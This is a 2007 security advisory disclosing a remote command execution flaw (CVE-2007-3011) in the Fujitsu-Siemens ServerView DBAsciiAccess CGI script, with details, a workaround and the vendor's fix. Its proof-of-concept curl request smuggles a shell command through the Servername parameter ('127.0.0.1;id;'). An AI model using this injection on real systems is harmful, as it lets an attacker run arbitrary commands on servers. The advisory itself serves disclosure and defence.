Subject: Fujitsu-Siemens ServerView Remote Command Execution

Advisory: Fujitsu-Siemens ServerView Remote Command Execution

RedTeam Pentesting discovered a remote command execution in the Fujitsu-
Siemens ServerView during a penetration test. The DBAsciiAccess CGI
script is vulnerable to a remote command execution because of a
parameter which is not properly sanitized. An attacker may run arbitrary
commands on the server with the permissions of the webserver user.


Details
=======

Product: Fujitsu Siemens Computers ServerView
Affected Versions: < 4.50.09
Fixed Versions: 4.50.09
Vulnerability Type: Remote Command Execution
Security-Risk: high
Vendor-URL: 
http://www.fujitsu-siemens.com/products/standard_servers/system_management/control.html
Vendor-Status: informed, fixed version released
Advisory-URL: http://www.redteam-pentesting.de/advisories/rt-sa-2007-002.php
Advisory-Status: public
CVE: CVE-2007-3011
CVE-URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3011


Introduction
============

"ServerView provides asset management tools for automated analysis and
version maintenance. It also supports the tracking of system
installation and status by collecting inventory data. Because they are
stored centrally, archives can be readily compared to a master version
to trace changes over time and highlight differences with the original
setup."

(from the vendor's homepage)


More Details
============

ServerView has a Remote Command Execution in its Webinterface. The
DBAsciiAccess CGI script provides a "ping" functionality.  In the
subparameter "Servername" of the parameter "Parameterlist" of this
script, the IP address to be pinged is given. This IP address will be
given as a parameter to the ping program without further sanitization.
By adding a trailing semicolon after the IP, an attacker can add
arbitrary shell commands which will be executed with the permissions of
the webserver user.


Proof of Concept
================

The following URL was wrapped for better readability.

curl
"http://www.example.com/cgi-bin/ServerView/
       SnmpView/DBAsciiAccess
       ?SSL=
       &Application=ServerView/SnmpView
       &Submit=Submit
       &UserID=1
       &Profile=
       &DBAccess=ASCII
       &Viewing=-1
       &Action=Show
       &ThisApplication=TestConnectivityFrame
       &DBElement=ServerName
       &DBValue=bcmes
       &DBList=snism
       &UserValue=

       &Sorting=
       &ParameterList=What--primary,,

                      Timeout--5,,
                      Community--public,,
                      ServerName--bcmes,,
                      Servername--127.0.0.1;id;,,       # vulnerable parameter
                      SType--Server"



Workaround
==========

Block access to the ServerView web interface for all untrusted users.


Fix
===

Version 4.50.09 of the linux agent fixes the problem. It can be downloaded 
with
the SW-ID: 1013988 under

http://www.fujitsu-siemens.com/support

Fujitsu-Siemens decided to make a silent fix, as the vulnerability is not
mentioned in the comments of the patch. They told RedTeam Pentesting that it
is fixed in this version, though.


Security Risk
=============

The security risk is high. An attacker is able to execute arbitrary
commands on the server with the permissions of the webserver user.
